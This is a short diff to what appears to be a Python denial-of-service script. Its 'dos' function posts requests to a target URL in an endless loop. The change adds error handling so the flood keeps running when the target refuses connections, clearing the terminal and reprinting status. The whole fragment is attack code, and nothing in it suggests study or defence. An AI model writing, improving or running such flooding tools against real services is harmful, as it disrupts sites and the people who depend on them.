@@ -42,7 +42,11 @@ if postdata == '':
     postdata = 'abcdefABCDEF'
 def dos(target):
     while True:
+        try:
             res = requests.post(url, data={'requesting': str(postdata),}) 
+        except requests.exceptions.ConnectionError:
+            clearterminal()
+            printinfo()
 clearterminal()
 print("-----------------------------------------")
 print("")
